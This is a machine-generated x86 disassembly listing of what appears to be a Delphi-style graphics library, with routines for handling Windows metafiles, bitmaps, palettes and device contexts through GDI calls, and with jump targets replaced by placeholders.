mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x1c ]
mov [ esi + 0x1c ] eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebx + 0x28 ]
call sub_428238
mov eax esi
mov [ ebx + 0x28 ] eax
call sub_428234
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
sub_427b54
push ebx
push esi
push edi
push ecx
mov ebx edx
mov esi eax
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax ebx
call sub_41c4ac
sub eax 0x4
mov [ esp ] eax
cmp [ esi + 0x2c ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_427c60
mov edx ebx
mov eax esi
call sub_427bd4
jmp r-xdata
xor ecx ecx
mov edx [ esp ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub eax [ esp ]
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_427bd4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
push 0x0
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40279c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427c50
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileBits
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41c710
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027bc
retn
sub_427c60
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x22 ]
xor ecx ecx
mov edx 0x16
call sub_402c40
mov ebx [ ebx + 0x28 ]
mov [ ebp - 0x22 ] 0x9ac6cdd7
mov ax [ ebx + 0x18 ]
test ax ax
jne r-xdata
mov [ ebp - 0x14 ] ax
mov [ ebp - 0x14 ] 0x60
jmp r-xdata
lea edx [ ebp - 0x22 ]
mov ecx 0x16
mov eax esi
call sub_41c710
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax esi
call sub_41c710
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427d82
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4027bc
retn
call sub_424d08
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call MulDiv
mov [ ebp - 0x18 ] ax
push 0x9ec
movzx eax [ ebp - 0x14 ]
push eax
mov eax [ ebx + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x16 ] ax
lea eax [ ebp - 0x22 ]
call sub_425af8
mov [ ebp - 0xe ] ax
push 0x0
call GetDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_427d9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
push 0x0
push 0x0
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_40279c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427d7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push 0x8
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
push eax
call GetWinMetaFileBits
cmp eax [ ebp - 0x8 ]
jae r-xdata
sub_427da8
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx eax
push 0xe
call GetClipboardData
mov edi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_4274b8
mov esi [ ebx + 0x28 ]
push 0x0
push edi
call CopyEnhMetaFileA
mov [ esi + 0x8 ] eax
lea eax [ ebp - 0x64 ]
push eax
push 0x64
mov eax [ esi + 0x8 ]
push eax
call GetEnhMetaFileHeader
mov eax [ ebp - 0x44 ]
sub eax [ ebp - 0x4c ]
mov [ esi + 0xc ] eax
mov eax [ ebp - 0x40 ]
sub eax [ ebp - 0x48 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x0
mov [ ebx + 0x2c ] 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ ebx + 0x22 ] al
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ rw-data ]
call sub_424c78
sub_427e2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edx ] 0xe
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax ] edx
push 0x0
mov eax [ esi + 0x8 ]
push eax
call CopyEnhMetaFileA
mov [ edi ] eax
sub_427f18
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_41a82c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427fb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427fbd
mov eax [ rw-data ]
call sub_41a890
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_427f8e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_4280a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_4248b0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a468
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_424854
test al al
je r-xdata
sub_427fc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_41a82c
mov esi eax
xor ecx ecx
push ebp
push sub_428034
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41a890
retn
mov edx ebx
mov eax esi
call sub_41a468
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_4280a8
sub_428040
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4243c0
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42807c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_4280a8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424484
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4280a8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4246c4
xor edx edx
push ebp
push sub_42813c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_424a38
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41a840
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4248b0
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_428148
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4246c4
xor eax eax
push ebp
push sub_428227
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_429464
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_427fc4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_429564
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424a38
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41a7a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4248b0
retn
sub_428238
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403234
sub_428258
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_427fc4
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d524
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4282b4
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_422d14
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_427fc4
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_427fc4
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_428300
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_425544
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4283af
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_4283bc
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_428408
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_427fc4
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_424db0
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424db0
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_428a56
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_40279c
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_428760
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_424c90
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_424db0
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_424db0
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_424db0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_424db0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_428a07
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4289f6
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4289d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_424db0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_4283bc
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_402998
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_425544
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4242a4
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_419034
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4235e4
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424268
call sub_4235e4
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_424d08
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4289db
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_424db0
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_4289aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424db0
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4027bc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4235e4
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424268
call sub_4235e4
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_4235e4
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_424268
call sub_4235e4
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_424db0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a6c
call sub_403a6c
jmp r-xdata
sub_4289fd
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_428a0c
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4039e8
call sub_403a3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_428a6c
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_428ad0
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_427fc4
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_428ccb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_424db0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424db0
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_424db0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_428c83
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
